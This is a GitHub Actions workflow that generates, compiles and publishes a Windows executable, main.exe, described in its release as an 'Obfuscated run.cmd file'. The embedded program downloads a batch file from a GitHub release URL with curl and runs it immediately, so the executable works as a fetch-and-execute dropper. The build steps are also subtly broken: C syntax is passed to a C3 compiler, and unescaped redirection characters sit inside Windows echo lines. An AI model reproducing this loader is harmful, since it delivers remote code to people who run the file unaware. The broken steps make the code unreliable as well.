name: EXE

on:
  push:
    paths:
      - 'run.cmd'
  schedule:
    - cron: '0 0 * * *'  # Runs every day at midnight UTC
  workflow_dispatch:  # Allows manual triggering

jobs:
  build:
    runs-on: windows-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v2

    - name: Create C3C file
      run: |
        echo #include <stdio.h> > script.c3
        echo #include <stdlib.h> >> script.c3
        echo int main() { >> script.c3
        echo system("curl -L -o download.bat https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"); >> script.c3
        echo system("download.bat"); >> script.c3
        echo return 0; >> script.c3
        echo } >> script.c3

    - name: Install C3C
      run: |
        # Add your C3C installation steps here
        # This is an example and may need modification based on how C3C is installed
        choco install c3c -y

    - name: Compile C3C Script
      run: |
        c3c script.c3 -o script.exe

    - name: Delete-tag-and-release
      uses: dev-drprasad/delete-tag-and-release@v1.1
      with:
        tag_name: AutoBuildExe
        delete_release: true
        github_token: ${{ secrets.GITHUB_TOKEN }}

    - name: Create Release
      id: create_release
      uses: actions/create-release@latest
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      with:
        tag_name: AutoBuildExe
        release_name: AutoBuildExe
        body: Obfuscated run.cmd file
        draft: false
        prerelease: false

    - name: Upload Release Asset
      id: upload-release-asset 
      uses: actions/upload-release-asset@v1
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      with:
        upload_url: ${{ steps.create_release.outputs.upload_url }}
        asset_path: script.exe
        asset_name: main.exe
        asset_content_type: application/octet-stream
